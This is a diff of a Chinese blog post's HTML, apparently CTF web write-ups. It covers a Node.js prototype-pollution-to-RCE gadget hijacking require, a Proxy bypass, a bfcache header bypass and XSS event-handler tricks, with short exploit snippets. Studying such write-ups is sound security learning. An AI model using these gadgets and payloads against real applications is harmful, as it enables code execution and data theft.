@@ -251,8 +251,8 @@
 <li>讀到 shadow DOM 的資料 (HITCON CTF 2022)</li>
 </ol>
 <span id="more"></span>
-<h2><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h2>
-<p>程式碼十分簡單：</p>
+
+<h2><span id="balsn-ctf-2022-2linenodejs">Balsn CTF 2022 - 2linenodejs</span></h2><p>程式碼十分簡單：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
 process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
@@ -276,15 +276,18 @@ module<span class="token punctuation">.</span><span class="token function-variab
         <span class="token punctuation">)</span>
     <span class="token punctuation">)</span><span class="token punctuation">,</span> o
 <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>很明顯有個 prototype pollution 的洞，因此這題考的就是你在 node.js 有了 prototype pollution 以後，要怎麼弄到 RCE。</p>
-<p>這邊還有一個關鍵是 catch 裡面的 <code>require('./usage')</code></p>
+<p>這邊還有一個關鍵是 catch 裡面的 <code>require(&#39;./usage&#39;)</code></p>
 <p>最後一個關鍵是這篇論文：<a target="_blank" rel="noopener" href="https://arxiv.org/abs/2207.11171">Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js</a>，裡面提到很多從原型污染打到 RCE 的案例，然後都有附上 gadget 或是一些提示。</p>
 <p>不過論文裡的其中一個洞在這題用的版本已經被修掉了：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484">https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484</a></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">:</span> expansion <span class="token operator">=</span> <span class="token string">''</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span>
     <span class="token function">RegExpPrototypeExec</span><span class="token punctuation">(</span><span class="token constant">EXPORTS_PATTERN</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span> <span class="token operator">||</span> kEmptyObject<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>kEmptyObject 是 <code>ObjectFreeze(ObjectCreate(null))</code>，所以不會被污染了。</p>
 <p>但總之在檔案裡面繼續找一找，就會發現另一個 <code>trySelf</code> 的 function 有同個問題，在這裏：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454">https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454</a></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">data</span><span class="token operator">:</span> pkg<span class="token punctuation">,</span> <span class="token literal-property property">path</span><span class="token operator">:</span> pkgPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">readPackageScope</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>這邊預設值也用了 <code>&#123;&#125;</code>，所以可以透過原型污染去干擾這些值。</p>
 <p>下面這一段程式碼，會去載入 <code>./pwn.js</code> 而不是 <code>./usage.js</code>：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
@@ -296,6 +299,7 @@ module<span class="token punctuation">.</span><span class="token function-variab
 <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./'</span>
 
 <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>因此透過原型污染，可以達成 require 任意文件。接下來的任務就是去找出哪個內建文件有可以使用的 payload，隊友找到 <code>/opt/yarn-v1.22.19/preinstall.js</code>，最後長這樣：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
   <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
@@ -312,21 +316,21 @@ module<span class="token punctuation">.</span><span class="token function-variab
 <span class="token punctuation">&#125;</span>
 
 <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>別人寫的 writeup：</p>
 <ol>
 <li><a target="_blank" rel="noopener" href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a></li>
 </ol>
-<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3>
-<p>這題最核心的部分可以看成是這樣：</p>
+<h3><span id="corctf-2022-sbxcalc">corCTF 2022 - sbxcalc</span></h3><p>這題最核心的部分可以看成是這樣：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">flag</span><span class="token operator">:</span> window<span class="token punctuation">.</span>flag <span class="token operator">||</span> <span class="token string">'flag'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
   <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token string">'nope'</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>試問要怎麼拿到被 proxy 擋住的 flag？</p>
 <p>答案是 <code>Object.getOwnPropertyDescriptor</code>。</p>
-<p><code>Object.getOwnPropertyDescriptor(p, 'flag')</code>，這樣就可以拿到原始的值，而不是 proxy 處理後的東西。</p>
+<p><code>Object.getOwnPropertyDescriptor(p, &#39;flag&#39;)</code>，這樣就可以拿到原始的值，而不是 proxy 處理後的東西。</p>
 <p>作者 writeup: <a target="_blank" rel="noopener" href="https://brycec.me/posts/corctf_2022_challenges#sbxcalc">https://brycec.me/posts/corctf_2022_challenges#sbxcalc</a></p>
-<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3>
-<p>Chrome 裡面有一種 cache 叫做 back/forward cache，簡稱 bfcache，這詞我還是第一次聽到：<a target="_blank" rel="noopener" href="http://web.dev/articles/bfcache">http://web.dev/articles/bfcache</a></p>
+<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3><p>Chrome 裡面有一種 cache 叫做 back&#x2F;forward cache，簡稱 bfcache，這詞我還是第一次聽到：<a target="_blank" rel="noopener" href="http://web.dev/articles/bfcache">http://web.dev/articles/bfcache</a></p>
 <p>第二個 disk cache 應該大家都比較熟悉了，fetched resourced 會存在裡面。</p>
 <p>利用這個 bfcache，可以做出很有趣的行為。</p>
 <p>現在有一個 API 是這樣：</p>
@@ -338,6 +342,7 @@ module<span class="token punctuation">.</span><span class="token function-variab
   <span class="token keyword">const</span> noteId <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">sendNote</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。</p>
 <p>但是搭配剛剛講到的 cache 行為，你可以：</p>
 <ol>
@@ -347,26 +352,28 @@ module<span class="token punctuation">.</span><span class="token function-variab
 </ol>
 <p>就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。</p>
 <p>整題更詳細的 writeup 可以看這邊：<a target="_blank" rel="noopener" href="https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote">https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote</a></p>
-<h3><span id="hitcon-ctf-2022">HITCON CTF 2022</span></h3>
-<p>先貼一下 maple 跟 splitline 的 writeup：</p>
+<h3><span id="hitcon-ctf-2022">HITCON CTF 2022</span></h3><p>先貼一下 maple 跟 splitline 的 writeup：</p>
 <ol>
-<li><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON CTF 2022</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.splitline.tw/hitcon-ctf-2022/">https://blog.splitline.tw/hitcon-ctf-2022/</a></li>
 </ol>
 <p>這次只有稍微看了一下 Self Destruct Message 那一題，簡單講一下幾個考點。</p>
 <p>第一個是執行 <code>element.innerHTML = str</code> 的時候，通常 HTML 裡面有什麼東西都會是非同步執行，例如說：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=console.log(1)>'</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>絕對是先 log 2 再來才是 1。</p>
 <p>但如果你這樣子寫：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span>
 div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;svg>&lt;svg onload=console.log(1)>'</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>就會很神奇的變成 1 在前面，而且這個 div 甚至不需要放到 DOM 裡面也會有作用。相關的討論可以看這一串：<a target="_blank" rel="noopener" href="https://twitter.com/terjanq/status/1421093136022048775">https://twitter.com/terjanq/status/1421093136022048775</a></p>
 <p>再來就是可以利用 error stack 去找出原本的 location，拿到 flag id：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'unhandledrejection'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">.</span>stack<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/message\/(\w+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>然後這題也有別的解法，雖然說元素是放在 shadow DOM 裡面，但是可以透過一些 xsleak 去偷出 flag，更完整的研究在這邊：<a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
 <p>類似題目有出現在 DiceCTF 2022，我有寫過一篇心得但是那時候還沒開始標關鍵字：<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</a></p>
 
